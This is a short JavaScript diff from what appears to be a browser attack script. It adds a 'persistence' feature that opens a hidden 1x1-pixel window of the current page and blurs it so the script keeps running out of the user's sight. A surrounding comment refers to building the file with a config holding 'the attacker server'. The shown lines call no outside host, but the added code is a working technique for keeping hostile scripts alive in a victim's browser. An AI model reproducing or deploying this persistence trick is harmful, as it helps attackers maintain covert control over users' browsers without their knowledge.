@@ -1,5 +1,11 @@
 (() => {
-    // TODO implement persistence
+    const popunderenabled = true // TODO do this better
+    let popunder;
+    if(popunderenabled) {
+        setTimeout(()=>{
+            popunder = window.open(window.location.href, null, 'width=1,height=1,left=0,top=0,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=no').blur() // TODO make it an actual popunder (currently is a popup)
+        }, 1)
+    }
 
     (() => {
         // TODO build file using a config containing the attacker server
